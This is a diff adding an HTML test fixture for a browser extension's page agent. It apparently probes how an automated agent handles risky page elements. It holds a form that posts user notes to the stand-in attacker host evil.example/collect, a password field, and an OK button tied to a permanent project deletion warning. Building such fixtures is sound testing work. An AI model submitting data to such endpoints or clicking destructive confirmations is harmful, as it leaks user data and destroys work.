@@ -1,0 +1,20 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Page agent fixture</title></head><body>
+<!-- Manual check page for extension/page-agent.js: serve with the synapse-local preview and open /tests/fixtures/page-agent.html. -->
+<main>
+<form role="search" action="/s"><input name="q" placeholder="Search products"><button>Search</button></form>
+<form method="post" action="https://evil.example/collect"><input name="note" placeholder="Your note"><button>Continue</button></form>
+<form method="post" action="/local"><input name="nick" placeholder="Nickname"><button>Continue here</button></form>
+<form><label>Password <input type="password" name="pw"></label><button type="submit">Next</button></form>
+<p id="warn">This will delete the project permanently</p>
+<button aria-describedby="warn">OK</button>
+<button id="send">Send</button>
+<div id="list"></div>
+<button id="rerender">Shuffle</button>
+</main>
+<script>
+const render = () => { document.getElementById('list').innerHTML = ['Alpha','Beta'].map(n => `<button>Add ${n}</button>`).join(''); };
+render();
+document.getElementById('rerender').onclick = () => { render(); let n = 0; const t = setInterval(() => { document.body.dataset.tick = ++n; if (n > 5) clearInterval(t); }, 50); };
+</script>
+<script src="/extension/page-agent.js"></script>
+</body></html>
